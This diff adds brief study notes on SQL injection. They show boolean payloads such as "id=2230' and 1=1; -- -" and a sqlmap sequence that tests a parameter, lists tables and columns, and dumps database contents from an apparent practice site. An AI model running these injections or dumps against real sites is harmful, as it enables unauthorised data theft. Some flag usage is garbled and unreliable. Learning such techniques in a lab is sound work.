@@ -1,0 +1,60 @@
+- change the value 
+
+	- sqli.site/view.php?id='
+
+	- insert a logical operation
+
+		- ... id=2230' and 1=1; -- -
+
+		// image appears 
+
+		- ... id=2230' and 1=2; -- - 
+
+
+	SELECT views_counter WHERE id='2230' and 1=1; -- - 
+
+		- "-- -" = do not add anything after the query on the server side 
+
+
+Specify the target 
+
+	- -h
+
+Techniques: 
+
+	- can set for UNION or SQL injections  
+
+
+Ex. 
+
+# sqlmap -u http://sqli.site/view.php?id=1 
+
+	// tests to see if the parameter is injectable 
+
+	// next which database it is using 
+
+
+	// result shows the parameter "ID" is vulnerable 
+
+	// shows the payload that was used as well & information about the OS, app tech, and the DBMS 
+
+- 1. get the database banner 
+
+	- same command and before and add the -b option 
+
+- 2. discover database tables with "--tables" 
+	
+	- will show all the tables in that specific database 
+	- will print out tables 
+
+- 3. get all the columns 
+
+	...id=1 --current-db <databasename> --column
+
+- 4. retrieve all the data in the columns 
+
+	...id=1 --current-db <databasename> --dump
+
+	- store? ENTER 
+	- dictionary? ENTER 
+
